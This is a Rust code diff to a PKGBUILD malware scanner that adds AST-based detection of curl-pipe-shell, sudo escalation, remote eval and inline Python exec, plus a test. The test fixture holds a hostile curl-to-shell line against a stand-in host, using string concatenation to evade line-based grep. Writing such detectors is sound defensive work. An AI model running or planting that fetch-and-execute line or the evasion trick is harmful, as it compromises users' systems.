@@ -636,7 +636,7 @@ pub(crate) struct Finding {
 /// severity-tagged findings (empty vec = clean).
 pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
     let mut findings = Vec::new();
-    if let Some(line) = line_of_curl_pipe_shell(source) {
+    if let Some(line) = crate::bash_ast::curl_pipe_shell(source).or_else(|| line_of_curl_pipe_shell(source)) {
         findings.push(Finding {
             line,
             severity: Severity::Suspicious,
@@ -712,7 +712,7 @@ pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
             message: "installs a named external package via npm/bun/yarn/pip/gem mid-build — the mechanism the Atomic Arch AUR campaign used to smuggle in its payload".to_string(),
         });
     }
-    if let Some(line) = line_of_sudo_escalation(source) {
+    if let Some(line) = crate::bash_ast::sudo_escalation(source).or_else(|| line_of_sudo_escalation(source)) {
         findings.push(Finding {
             line,
             severity: Severity::Suspicious,
@@ -726,14 +726,14 @@ pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
             message: "references a .onion address — legitimate PKGBUILDs don't hardcode Tor hidden-service addresses; matches the Tor-backed second-stage delivery reused across the June 2026 and Jul/Aug 2026 AUR campaigns".to_string(),
         });
     }
-    if let Some(line) = line_of_eval_remote_exec(source) {
+    if let Some(line) = crate::bash_ast::eval_remote_exec(source).or_else(|| line_of_eval_remote_exec(source)) {
         findings.push(Finding {
             line,
             severity: Severity::Suspicious,
             message: "runs `eval` on a curl/wget command substitution — executes fetched remote content without a literal pipe-into-shell to grep for".to_string(),
         });
     }
-    if let Some(line) = line_of_python_inline_exec(source) {
+    if let Some(line) = crate::bash_ast::python_inline_exec(source).or_else(|| line_of_python_inline_exec(source)) {
         findings.push(Finding {
             line,
             severity: Severity::Suspicious,
@@ -1359,5 +1359,17 @@ build() {
             resolve_install_filename(pkgbuild),
             Some("totally-legit-tool.install".to_string())
         );
+    }
+
+    #[test]
+    fn ast_catches_concatenation_evasion_line_heuristic_would_miss() {
+        // `s""h` is bash string concatenation for the literal shell name
+        // "sh" at runtime, but no single token in the source text equals
+        // "sh" for a naive line-based grep to match. The AST path (tried
+        // first in scan_pkgbuild_source) resolves the concatenation and
+        // still catches it.
+        let src = "curl -sSL https://evil.example.com/x | s\"\"h\n";
+        let findings = scan_pkgbuild_source(src);
+        assert!(findings.iter().any(|f| f.message.contains("curl/wget | sh")));
     }
 }
